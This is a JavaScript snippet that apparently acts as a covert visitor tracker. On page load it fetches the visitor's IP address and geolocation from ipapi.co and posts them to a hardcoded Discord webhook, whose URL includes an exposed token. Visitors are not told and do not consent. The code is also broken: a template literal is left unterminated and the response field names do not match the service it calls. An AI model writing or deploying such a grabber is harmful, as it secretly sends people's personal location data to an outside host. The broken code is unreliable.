const WEBHOOK_URL = `https://discord.com/api/webhooks/1349504538830180454/qOd1jZYQtGYOS-eIZyEcksqIcq3NOKozaV_ZJiW8Ou7KZnEx_3qfrqV1txMJQhk1emhY;
function sendToDiscord(ipData, locationData) {
    const ip = ipData.query;
    const city = ipData.city;
    const region = ipData.region;
    const country = ipData.country;
    const longitude = ipData.lon;
    const latitude = ipData.lat;

    let locationMessage = `Latitude: ${latitude} | Longitude: ${longitude}`;
    let addressMessage = '';

    if (locationData) {
        const { lat, lon, address } = locationData;
        locationMessage = `Latitude: ${lat} | Longitude: ${lon}`;
        addressMessage = `Address: ${address}`;
    }

    const message = `\`\`\`
IP Address: ${ip}
Location: ${city}, ${region}, ${country}
${locationMessage}
${addressMessage}
\`\`\``;

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
    })
    .then(response => console.log(`Sent message to Discord with status ${response.status}`))
    .catch(error => console.error(`Error sending message to Discord: ${error}`));
}

function sendIPData() {
    fetch('https://ipapi.co/json')
        .then(response => response.json())
        .then(ipData => {
            sendToDiscord(ipData, null); // Send IP data to Discord
        })
        .catch(error => console.error(`Error retrieving IP data: ${error}`));
}

// Call the function to send IP data when the page loads
window.onload = sendIPData; 